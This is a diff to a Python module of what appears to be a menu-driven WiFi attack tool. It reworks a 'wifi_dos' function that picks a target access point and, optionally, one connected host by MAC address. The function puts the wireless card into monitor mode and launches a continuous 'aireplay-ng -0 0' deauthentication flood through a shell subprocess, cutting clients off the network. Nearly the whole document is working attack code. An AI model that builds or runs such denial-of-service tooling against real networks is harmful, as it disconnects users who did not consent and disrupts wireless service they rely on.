@@ -28,13 +28,14 @@ import signal
 
 def wifi_dos(device):
     utils.header("WiFi DOS (Deauth) Attack","Configure WiFi Deauth Parameters")
+    
+    #Get Target
     target = wpascan.get_target(device)
-
     if target == None:
         return
 
+    #Target host that is connected to the WiFi network (optional)
     target_host = ""
-
     invalid_mac = True
     if utils.yesNo("WiFi DOS (Deauth) Attack","Configure WiFi Deauth Parameters","Use Host Specific Mode?", False):
         while invalid_mac:
@@ -47,6 +48,7 @@ def wifi_dos(device):
         utils.header("WiFi DOS (Deauth) Attack", "Note that this configuration won't be as effective as using Host Specific Mode.")
     utils.getch()
 
+    #Display descriptions
     target_descs = [
                 "Death Attack Target",
                 "SSID: " + target["essid"],
@@ -55,16 +57,22 @@ def wifi_dos(device):
                 "Host Specific Mode: " + str(not(target_host == "")),
                 "Target Host: " + target_host
             ]
+
+    #Ask if to begin WiFi DOS Attack
     if utils.yesNo("WiFi DOS (Deauth) Attack", target_descs, "Start WiFi DOS Attack?", False):        
-        utils.header("WiFi DOS (Deauth) Attack", "WiFi DOS Attack Starting...")
-        process_command = deauth_wifi_command(target, device, target_host)
-        
+        #Start monitor
         utils.header("Loading WiFi DOS attack...")
         enable = interface.enable_monitor(device, channel=target["channel"])
         device = enable[1]
 
+        #Build deauth command
+        utils.header("WiFi DOS (Deauth) Attack", "WiFi DOS Attack Starting...")
+        process_command = deauth_wifi_command(target, device, target_host)
+
+        #Commence process
         process = subprocess.Popen(process_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
+        #
         utils.header("WiFi DOS (Deauth) Attack", ["WiFi DOS Attack Ongoing...","WiFi DOS PID: " + str(process.pid)])
         utils.getch("Press enter to stop WiFi DOS Attack...")
         
@@ -75,11 +83,10 @@ def wifi_dos(device):
         utils.header("WiFi DOS (Deauth) Attack", "WiFi DOS Attack Cancelled!")
 
 #Returns deauth WiFi command to be executed.
-def deauth_wifi_command(wifi:dict, device, host_macaddress:""):
+def deauth_wifi_command(wifi:dict, device, host_macaddress=""):
     wifi_macaddress = wifi["bssid"]
     device_logicalname = interface.get_logicalname(device)
-
     if host_macaddress == "":
-        return "aireplay-ng -0 0 -a " + wifi_macaddress + " " + device_logicalname
+        return "aireplay-ng -0 0 -a " + wifi_macaddress + " " + device_logicalname #w/o host target
     else:
-        return "aireplay-ng -0 0 -a " + wifi_macaddress + " -c " + host_macaddress + " " + device_logicalname
+        return "aireplay-ng -0 0 -a " + wifi_macaddress + " -c " + host_macaddress + " " + device_logicalname #w/ host_target
